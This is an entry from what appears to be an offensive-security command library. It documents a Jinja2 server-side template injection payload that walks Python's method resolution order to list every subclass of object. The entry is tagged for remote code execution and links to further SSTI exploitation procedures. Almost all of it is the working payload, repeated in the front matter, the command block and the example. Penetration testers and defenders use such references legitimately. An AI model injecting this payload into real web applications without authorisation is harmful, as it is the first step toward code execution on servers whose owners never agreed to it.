---
id: 28cceeef-7ccf-41e0-947b-cf72a2e19edb
name: jinja2-list-subclasses-mro
type: command
executor: bash
data: '{{''''.__class__.mro()[1].__subclasses__()}}'
output: null
created_at: '2025-12-11T03:47:39.249Z'
updated_at: '2025-12-11T03:47:39.249Z'
platforms:
  - Web
tags:
  - ssti
  - jinja2
  - rce
verified: false
validated: true
submitted: true
---

# jinja2-list-subclasses-mro

## Command

```bash
{{''.__class__.mro()[1].__subclasses__()}}
```

## Description

Uses method resolution order to access and list subclasses of the object class for SSTI exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| __subclasses__() | Method to get subclasses | Yes |
| ''.__class__.mro()[1] | Accesses the base class via MRO | Yes |

## Examples

### Basic Usage

```bash
{{''.__class__.mro()[1].__subclasses__()}}
```

## Expected Output

List of subclasses

## Related

- [[procedures/Explore-Advanced-SSTI-Payloads-for-Exploitation]]
